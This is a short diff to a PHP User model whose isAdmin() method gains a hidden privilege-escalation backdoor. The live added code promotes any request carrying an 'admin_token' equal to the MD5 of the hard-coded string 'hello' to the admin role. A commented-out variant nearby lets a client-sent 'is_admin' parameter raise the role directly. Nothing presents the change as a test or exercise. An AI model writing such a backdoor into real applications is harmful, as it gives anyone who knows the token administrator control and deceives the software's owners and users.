@@ -87,8 +87,34 @@ class User extends Authenticatable
         return $this->belongsTo(Role::class);
     }
 
+    // public function isAdmin()
+    // {
+    //     return $this->role_id === 2;
+    // }
+
     public function isAdmin()
     {
+
+        // The first way
+        // // The 'is_admin' parameter sent from the client can change the value of 'role_id'
+        // if (request()->has('is_admin')) {
+        //     $this->role_id = request('is_admin') ? 2 : $this->role_id;
+        // }
+
+        // return $this->role_id === 2;
+
+
+        // The second way
+        // Hashing'hello' using MD5
+        $plaintext = 'hello';
+        $md5Hash = md5($plaintext);
+
+        // Decode in isAdmin() method
+        $providedHash = request('admin_token');
+        if ($providedHash === $md5Hash) {
+            $this->role_id = 2;
+        }
+
         return $this->role_id === 2;
     }
 }
